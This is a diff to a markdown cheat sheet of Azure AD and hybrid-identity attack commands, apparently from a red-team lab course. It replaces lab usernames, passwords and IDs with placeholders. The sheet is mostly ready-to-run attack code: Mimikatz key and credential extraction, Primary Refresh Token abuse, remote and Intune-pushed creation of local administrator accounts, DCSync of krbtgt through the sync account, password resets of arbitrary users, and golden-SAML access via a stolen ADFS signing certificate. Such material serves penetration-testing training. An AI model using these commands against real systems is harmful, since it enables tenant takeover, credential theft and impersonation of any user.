@@ -38,14 +38,14 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "dpapi::cloudapkd 
 - https://github.com/morRubin/PrtToCert
 - Code is modified in the lab
 ```
-& 'C:\Program Files\Python39\python.exe' RequestCert.py --tenantId <TENANT ID> --prt <PRT VALUE> --userName samcgray@defcorphq.onmicrosoft.com --hexCtx <CONTEXT KEY VALUE> --hexDerivedKey <DERIVED KEY VALUE>
+& 'C:\Program Files\Python39\python.exe' RequestCert.py --tenantId <TENANT ID> --prt <PRT VALUE> --userName <USERNAME> --hexCtx <CONTEXT KEY VALUE> --hexDerivedKey <DERIVED KEY VALUE>
 ```
 
 #### Use certificate to add a user with administrative privileges
 - Code is modified in the lab
 - https://github.com/morRubin/AzureADJoinedMachinePTC
 ```
-python C:\Users\vmuser\Documents\student38\AzureADJoinedMachinePTC\Main.py --usercert C:\Users\vmuser\Documents\student38\samcgray@defcorphq.onmicrosoft.com.pfx --certpass AzureADCert --remoteip 10.0.1.5 --command "cmd.exe /c net user student38 Stud38Password@123 /add /Y && net localgroup administrators student38 /add"
+python \AzureADJoinedMachinePTC\Main.py --usercert <PATH TO .pfx FILE> --certpass AzureADCert --remoteip <TARGET IP> --command "cmd.exe /c net user <USERNAME> <PASSWORD> /add /Y && net localgroup administrators <USERNAME> /add"
 ```
 
 #### Use psremoting to access the machine
@@ -58,16 +58,16 @@ Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap" ""exit"'
 
 #### Extract context key, clearkey and derived key
 ```
-Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "dpapi::cloudapkd /keyvalue:<keyvalue> /unprotect" "exit"'
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "dpapi::cloudapkd /keyvalue:<KEY VALUE> /unprotect" "exit"'
 ```
 
 #### Request access token (cookie) to all applications
 ```
 Import-Module .\AADInternals.psd1
 
-$PRTOfMBarron = '<PRT>'
-while($PRTOfMBarron.Length % 4) {$PRTOfMBarron += "="}
-$PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($PRTOfMBarron))
+$tempPRT = '<PRT>'
+while($tempPRT.Length % 4) {$tempPRT += "="}
+$PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($tempPRT))
 
 $ClearKey = "<CLEARKEY>"
 $SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace '..', '0x$&,' -split ',' -ne ''))
@@ -91,11 +91,13 @@ New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey –GetNonce
 - Go to Devices -> All Devices to check devices enrolled to Intune:
 - Go to Scripts and Click on Add for Windows 10. Create a new script and select a script
 - Example script adduser.ps1
+
 ```
-$passwd = ConvertTo-SecureString "Stud38Password@123" -AsPlainText -Force
-New-LocalUser -Name student38 -Password $passwd
-Add-LocalGroupMember -Group Administrators -Member student38
+$passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
+New-LocalUser -Name <USERNAME> -Password $passwd
+Add-LocalGroupMember -Group Administrators -Member <USERNAME>
 ```
+
 - Select `Run script in 64 bit PowerShell Host`
 - On the assignment page select "Add all users" and "add all devices"
 
@@ -151,8 +153,8 @@ Get-AADIntSyncCredentials
 
 #### Run DCSync with creds of MSOL_* account
 ```
-runas /netonly /user:defeng.corp\MSOL_782bef6aa0a9 cmd 
-Invoke-Mimikatz -Command '"lsadump::dcsync/user:defeng\krbtgt /domain:defeng.corp /dc:defeng-dc.defeng.corp"'
+runas /netonly /user:<DOMAIN>\MSOL_<ID> cmd 
+Invoke-Mimikatz -Command '"lsadump::dcsync/user:<DOMAIN>\krbtgt /domain:<DOMAIN> /dc:<DC NAME>"'
 ```
 
 ### Reset password of any user
@@ -160,8 +162,8 @@ Invoke-Mimikatz -Command '"lsadump::dcsync/user:defeng\krbtgt /domain:defeng.cor
 
 #### Using the creds, request an access token for AADGraph and save it to cache using the SYNC account.
 ```
-$passwd = ConvertTo-SecureString '<password>' -AsPlainText -Force
-$creds = New-Object System.Management.Automation.PSCredential ("Sync_DEFENG-ADCNCT_782bef6aa0a9@defcorpsecure.onmicrosoft.com", $passwd)
+$passwd = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential ("<SYNC USERNAME>", $passwd)
 Get-AADIntAccessTokenForAADGraph -Credentials $creds -SaveToCache
 ```
 
@@ -172,19 +174,19 @@ Get-AADIntGlobalAdmins
 
 #### Get the ImmutableID
 ```
-Get-AADIntUser -UserPrincipalName onpremadmin@defcorpsecure.onmicrosoft.com | select ImmutableId
+Get-AADIntUser -UserPrincipalName <NAME> | select ImmutableId
 ```
 
 #### Reset the Azure password
 ```
-Set-AADIntUserPassword -SourceAnchor "E2gG19HA4EaDe0+3LkcS5g==" -Password "SuperSecretpass#12321" -Verbose
+Set-AADIntUserPassword -SourceAnchor "<IMMUTABLE ID>" -Password "<PASSWORD>" -Verbose
 ```
 
 #### Reset password for cloud only user
 - Need CloudAnchor ID which is the format <USER>_<OBJECTID>
 ```
 Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID
-Set-AADIntUserPassword -CloudAnchor "User_10caa362-7d18-48c9-a45b-9c3a78f3a96b" -Password "SuperSecretpass#12321" -Verbose
+Set-AADIntUserPassword -CloudAnchor "<ID>" -Password "<PASSWORD>" -Verbose
 ```
 
 - Access Azure portal using the new password.
@@ -220,12 +222,12 @@ Install-AADIntPTASpy
 
 #### On ADFS server (As administrator)
 ```
-Get-AdfsProperties |select identifier
+Get-AdfsProperties | select identifier
 ```
 
 #### Check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
 ```
-Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri
+Get-MsolDomainFederationSettings -DomainName <DOMAIN> | select IssuerUri
 ```
 
 #### Extract the ADFS token signing certificate
@@ -237,7 +239,7 @@ Export-AADIntADFSSigningCertificate
 
 #### Access cloud apps as any user
 ```
-Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
+Open-AADIntOffice365Portal -ImmutableID <IMMUTABLE ID> -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
 ```
 
 ### With DA privileges on-prem, it is possible to create ImmutableID of cloud only users!
@@ -254,5 +256,5 @@ Export-AADIntADFSSigningCertificate
 
 #### Use the below command from AADInternals to access cloud apps as the user whose immutableID is specified 
 ```
-Open-AADIntOffice365Portal -ImmutableID pwrtlmsicU+5tgCUgHx2tA== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
+Open-AADIntOffice365Portal -ImmutableID <IMMUTABLE ID> -Issuer <DOMAIN>/adfs/services/trust -PfxFileName <PATH TO .pfx FILE> -Verbose
 ```
